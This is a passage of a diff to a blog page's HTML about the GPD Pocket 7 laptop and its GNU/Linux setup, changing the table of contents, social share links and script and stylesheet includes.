class="toc-number">5.0.4.</span> <span class="toc-text">Mouse</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Price"><span class="toc-number">5.0.5.</span> <span class="toc-text">Price</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Speed-Usability"><span class="toc-number">5.0.6.</span> <span class="toc-text">Speed / Usability</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Connectivity"><span class="toc-number">5.0.7.</span> <span class="toc-text">Connectivity</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Links"><span class="toc-number">5.0.8.</span> <span class="toc-text">Links</span></a></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Specs"><span class="toc-number">1.</span> <span class="toc-text">Specs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Installing-GNU-Linux"><span class="toc-number">2.</span> <span class="toc-text">Installing GNU&#x2F;Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Updating-custom-Kernel-and-stuff"><span class="toc-number">3.</span> <span class="toc-text">Updating custom Kernel and stuff.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Getting-Offensive"><span class="toc-number">4.</span> <span class="toc-text">Getting Offensive</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impressions-amp-Links"><span class="toc-number">5.</span> <span class="toc-text">Impressions &amp; Links</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Keyboard"><span class="toc-number">5.0.1.</span> <span class="toc-text">Keyboard</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Battery-Life"><span class="toc-number">5.0.2.</span> <span class="toc-text">Battery Life</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Display"><span class="toc-number">5.0.3.</span> <span class="toc-text">Display</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mouse"><span class="toc-number">5.0.4.</span> <span class="toc-text">Mouse</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Price"><span class="toc-number">5.0.5.</span> <span class="toc-text">Price</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Speed-Usability"><span class="toc-number">5.0.6.</span> <span class="toc-text">Speed &#x2F; Usability</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Connectivity"><span class="toc-number">5.0.7.</span> <span class="toc-text">Connectivity</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Links"><span class="toc-number">5.0.8.</span> <span class="toc-text">Links</span></a></li></ol></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&text=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&is_video=false&description=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&text=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&is_video=false&description=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
   <li><a class="icon" href="mailto:?subject=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup&body=Check out this article: https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&name=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup&description=&lt;p&gt;It’s no secret I’ve been recently playing with the &lt;a href=&quot;https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GPD Pocket 7&lt;/a&gt;, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the &lt;a href=&quot;https://www.google.com/search?&amp;amp;source=lnms&amp;amp;tbm=isch&amp;amp;q=open+zaurus+sl-c1000&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sharp Zaurus&lt;/a&gt; series. Considering that a &lt;a href=&quot;https://twitter.com/evilsocket/status/896847606072127488&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;lot of people were interested&lt;/a&gt; I decided to write this post to share my impressions, installation procedure and configuration tips.&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg&quot; alt=&quot;gpd&quot;&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&title=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/&name=GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup&description=&lt;p&gt;It’s no secret I’ve been recently playing with the &lt;a href=&#34;https://www.indiegogo.com/projects/gpd-pocket-7-0-umpc-laptop-ubuntu-or-win-10-os-laptop--2&#34;&gt;GPD Pocket 7&lt;/a&gt;, an ultra small laptop which can run GNU/Linux and has more than decent hardware. Tablets are cool and everything, but I’ve been a fan of ultra portable Linux devices since the &lt;a href=&#34;https://www.google.com/search?&amp;source=lnms&amp;tbm=isch&amp;q=open+zaurus+sl-c1000&#34;&gt;Sharp Zaurus&lt;/a&gt; series. Considering that a &lt;a href=&#34;https://twitter.com/evilsocket/status/896847606072127488&#34;&gt;lot of people were interested&lt;/a&gt; I decided to write this post to share my impressions, installation procedure and configuration tips.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg&#34; alt=&#34;gpd&#34;&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -301,13 +321,23 @@ sudo git reset --hard origin/master
 </body>
 </html>
 <!-- styles -->
+
 <link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+
+
 <link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
 
+
 <!-- jquery -->
+
 <script src="/lib/jquery/jquery.min.js"></script>
+
+
 <script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
 <script src="/js/main.js"></script>
+
 <!-- search -->
 
 <!-- Google Analytics -->
